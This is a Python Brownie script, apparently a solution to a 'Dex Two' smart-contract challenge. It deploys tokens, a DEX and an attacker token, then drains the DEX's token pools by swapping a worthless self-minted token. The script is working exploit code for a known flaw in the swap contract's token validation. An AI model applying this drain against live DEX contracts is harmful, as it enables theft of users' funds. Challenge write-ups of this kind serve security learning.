from brownie import network, ChandrToken, DudichToken, AttackToken, DexTwo
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3


def deploy_token_one(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = ChandrToken.deploy(110, {"from": account}, publish_source=publish)
    print(
        f"Cotntract --ChandrToken-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_token_two(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = DudichToken.deploy(110, {"from": account}, publish_source=publish)
    print(
        f"Cotntract --DudichToken-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_token_attack(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = AttackToken.deploy(3000, {"from": account}, publish_source=publish)
    print(
        f"Cotntract --AttackToken-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_contract(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = DexTwo.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --DexTwo-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def print_balances(
    contract, token_one, token_two, attack_token, attacker_account, owner_account
):
    print(
        f"Contract balance of Token 1: {contract.balanceOf(token_one.address, contract.address)}"
    )
    print(
        f"Contract balance of Token 2: {contract.balanceOf(token_two.address, contract.address)}"
    )
    print(
        f"Contract balance of Evil Token: {contract.balanceOf(attack_token.address, contract.address)}"
    )
    print(
        f"Owner balance of Token 1: {contract.balanceOf(token_one.address, owner_account.address)}"
    )
    print(
        f"Owner balance of Token 2: {contract.balanceOf(token_two.address, owner_account.address)}"
    )
    print(
        f"Owner balance of Evil Token: {contract.balanceOf(attack_token.address, owner_account.address)}"
    )
    print(
        f"Attacker balance of Token 1: {contract.balanceOf(token_one.address, attacker_account.address)}"
    )
    print(
        f"Attacker balance of Token 2: {contract.balanceOf(token_two.address, attacker_account.address)}"
    )
    print(
        f"Attacker balance of Evil Token: {contract.balanceOf(attack_token.address, attacker_account.address)}"
    )


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    token_one = deploy_token_one(owner_account)
    token_two = deploy_token_two(owner_account)
    contract = deploy_contract(owner_account)
    attack_token = deploy_token_attack(attacker_account)
    print("Setting up tokens")
    tx = contract.setTokens(token_one.address, token_two.address)
    tx.wait(1)
    print(f"Token 1 is: {contract.token1()}, Token 2 is: {contract.token2()}")
    print_balances(
        contract, token_one, token_two, attack_token, attacker_account, owner_account
    )
    print("Generating contract liqudity")
    tx = token_one.approve(contract.address, 500, {"from": owner_account})
    tx.wait(1)
    tx = token_two.approve(contract.address, 500, {"from": owner_account})
    tx.wait(1)
    tx = contract.add_liquidity(token_one, 100, {"from": owner_account})
    tx.wait(1)
    tx = contract.add_liquidity(token_two, 100, {"from": owner_account})
    tx.wait(1)
    print_balances(
        contract, token_one, token_two, attack_token, attacker_account, owner_account
    )
    print("Transfering tokens to attacker")
    tx = token_one.transfer(
        attacker_account.address, 10, {"from": owner_account.address}
    )
    tx.wait(1)
    tx = token_two.transfer(
        attacker_account.address, 10, {"from": owner_account.address}
    )
    tx.wait(1)
    print_balances(
        contract, token_one, token_two, attack_token, attacker_account, owner_account
    )
    print("Approving transactions to attacker")
    tx = token_one.approve(contract.address, 5000, {"from": attacker_account})
    tx.wait(1)
    tx = token_two.approve(contract.address, 5000, {"from": attacker_account})
    tx.wait(1)
    tx = attack_token.approve(contract.address, 5000, {"from": attacker_account})
    tx.wait(1)
    print(
        "\n\n\n ============================= ATTACKING =============================\n\n\n"
    )
    tx = attack_token.transfer(contract.address, 100, {"from": attacker_account})
    tx.wait(1)
    tx = contract.swap(
        attack_token.address, token_two.address, 100, {"from": attacker_account.address}
    )
    tx.wait(1)
    print_balances(
        contract, token_one, token_two, attack_token, attacker_account, owner_account
    )
    tx = contract.swap(
        attack_token.address,
        token_one.address,
        200,
        {"from": attacker_account.address},
    )
    tx.wait(1)
    print_balances(
        contract, token_one, token_two, attack_token, attacker_account, owner_account
    )


if __name__ == "__main__":
    main()
